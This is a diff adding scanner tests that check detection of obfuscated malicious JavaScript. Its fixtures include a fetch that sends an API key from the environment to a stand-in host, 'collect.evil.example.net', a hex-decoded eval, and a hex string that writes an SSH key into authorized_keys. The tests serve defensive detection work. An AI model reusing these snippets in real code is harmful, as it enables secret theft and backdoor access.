@@ -246,3 +246,60 @@ describe('regex rules', () => {
     expect(finding?.line).toBe(1)
   })
 })
+
+describe('obfuscation-hardening rules', () => {
+  const config = testConfig()
+  const options = testScanOptions(config)
+  const phraseRules = options.phraseRules
+  const urlRules = options.urlRules
+  const allowlist = options.allowlist
+
+  it('flags computed member access on global objects', () => {
+    const scan = analyzeSource('evil.js', '.js', "globalThis['proce' + 'ss']['en' + 'v'].API_KEY\n", options.rules, phraseRules, urlRules, allowlist, [])
+    expect(scan.findings.some(finding => finding.ruleId === 'code.indirect-access')).toBe(true)
+  })
+
+  it('flags computed member access on process', () => {
+    const scan = analyzeSource('evil.js', '.js', "process['env']\n", options.rules, phraseRules, urlRules, allowlist, [])
+    expect(scan.findings.some(finding => finding.ruleId === 'code.indirect-access')).toBe(true)
+  })
+
+  it('does not flag plain member access on globals (ast-member rules own it)', () => {
+    const scan = analyzeSource('evil.js', '.js', 'process.env.API_KEY\n', options.rules, phraseRules, urlRules, allowlist, [])
+    expect(scan.findings.some(finding => finding.ruleId === 'code.indirect-access')).toBe(false)
+  })
+
+  it('flags Buffer.from with a hex or base64 encoding argument', () => {
+    const findings = analyzeContent('evil.js', "const hex = (h) => Buffer.from(h, 'hex').toString()\n", options.rules, phraseRules, urlRules, allowlist, [], false, [])
+    expect(findings.some(finding => finding.ruleId === 'code.encoding-buffer')).toBe(true)
+  })
+
+  it('flags long hex-only string literals as encoded payloads', () => {
+    const payload = '6e6f64653a66732e777269746546696c6553796e63287265717569726528276e6f64653a6f7327292e686f6d656469722829202b20272f2e7373682f617574686f72697a65645f6b657973272c20277373682d72736120414141412e2e2e2729'
+    const scan = analyzeSource('evil.js', '.js', `const p = '${payload}'\n`, options.rules, phraseRules, urlRules, allowlist, [])
+    expect(scan.findings.some(finding => finding.ruleId === 'code.encoded-string')).toBe(true)
+  })
+
+  it('does not flag short or non-hex strings', () => {
+    const scan = analyzeSource('ok.js', '.js', 'const a = "abc123"; const b = "cafebabe";\n', options.rules, phraseRules, urlRules, allowlist, [])
+    expect(scan.findings.some(finding => finding.ruleId === 'code.encoded-string')).toBe(false)
+  })
+
+  it('flags the full obfuscated sample: helper, payload and indirect access', () => {
+    const dir = writeTempFiles({
+      'src/index.js': [
+        "const hex = (h) => Buffer.from(h, 'hex').toString()",
+        "const token = globalThis['proce' + 'ss']['en' + 'v'].API_KEY",
+        "const host = 'collect.' + 'evil' + '.example' + '.net'",
+        "fetch('https://' + host + '/log?t=' + token)",
+        "globalThis['ev' + 'al'](hex('6e6f64653a66732e777269746546696c6553796e63'))",
+      ].join('\n'),
+    })
+    const report = scanDir(dir)
+    const ruleIds = report.findings.map(finding => finding.ruleId)
+    expect(ruleIds).toContain('code.indirect-access')
+    expect(ruleIds).toContain('code.encoding-buffer')
+    expect(ruleIds).toContain('code.encoded-string')
+    expect(report.verdict).toBe('warn')
+  })
+})
